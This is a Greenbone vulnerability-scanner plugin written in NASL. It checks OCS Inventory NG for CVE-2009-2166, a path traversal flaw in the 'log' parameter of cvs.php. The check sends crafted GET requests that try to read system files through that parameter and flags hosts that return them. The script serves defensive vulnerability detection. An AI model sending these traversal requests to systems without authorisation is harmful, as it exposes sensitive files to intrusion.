# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ocsinventory-ng:ocs_inventory_ng";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900378");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-06-26 07:55:21 +0200 (Fri, 26 Jun 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2009-2166");
  script_name("OCS Inventory NG 'cvs.php' Information Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_ocs_inventory_ng_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ocs_inventory_ng/detected");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8868");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/50946");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause path traversal attack,
  and gain sensitive information.");

  script_tag(name:"affected", value:"OCS Inventory NG version prior to 1.02.1.");

  script_tag(name:"insight", value:"The flaw is due to improper sanitization of user supplied input through the
  'cvs.php' file which can exploited by sending a direct request to the 'log' parameter.");

  script_tag(name:"solution", value:"Upgrade to OCS Inventory NG version 1.02.1 or later.");

  script_tag(name:"summary", value:"OCS Inventory NG is prone to an information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file(keys(files)) {

  url = dir + "/cvs.php?log=/" + files[file];
  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
